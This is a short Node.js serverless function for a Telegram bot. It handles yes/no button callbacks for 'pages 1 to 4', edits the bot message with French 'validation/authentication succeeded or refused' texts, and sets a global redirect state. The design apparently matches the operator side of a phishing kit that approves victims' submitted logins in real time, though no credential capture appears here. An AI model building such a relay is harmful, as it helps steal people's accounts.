const fetch = require('node-fetch');

exports.handler = async (event, context) => {
  const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN;
  const update = JSON.parse(event.body);

  if (update.callback_query) {
    const callbackData = update.callback_query.data;
    const chatId = update.callback_query.message.chat.id;
    const messageId = update.callback_query.message.message_id;

    let responseMessage = '';
    let page = '';
    let action = '';

    if (callbackData === 'yes_pages123') {
      responseMessage = 'Validation réussie ! Redirection en cours...';
      page = 'page3';
      action = 'yes';
    } else if (callbackData === 'no_pages123') {
      responseMessage = 'Validation refusée.';
      page = 'page3';
      action = 'no';
    } else if (callbackData === 'yes_pages1to4') {
      responseMessage = 'Authentification réussie ! Redirection en cours...';
      page = 'page4';
      action = 'yes';
    } else if (callbackData === 'no_pages1to4') {
      responseMessage = 'Authentification refusée.';
      page = 'page4';
      action = 'no';
    }

    await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/editMessageText`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: chatId,
        message_id: messageId,
        text: responseMessage
      })
    });

    global.telegramResponse = { page, action };
  }

  return {
    statusCode: 200,
    body: 'OK'
  };
};